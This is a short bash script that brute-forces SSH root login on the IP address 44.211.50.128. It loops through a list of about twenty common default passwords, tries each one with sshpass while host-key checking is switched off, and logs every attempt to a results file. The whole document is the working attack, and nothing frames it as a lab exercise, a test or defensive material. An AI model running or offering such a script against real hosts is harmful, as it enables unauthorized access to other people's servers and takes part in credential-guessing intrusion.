echo "Start time: $(date)" >> crowie_results.txt
for pass in 123456 password admin root toor qwerty letmein changeme abc123 1234 12345 welcome monkey dragon iloveyou admin123 passw0rd 111111 123123 sunshine master; do
  echo "Trying: $pass" >> crowie_results.txt
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no root@44.211.50.128 "exit" >> crowie_results.txt 2>&1
  sleep 3
done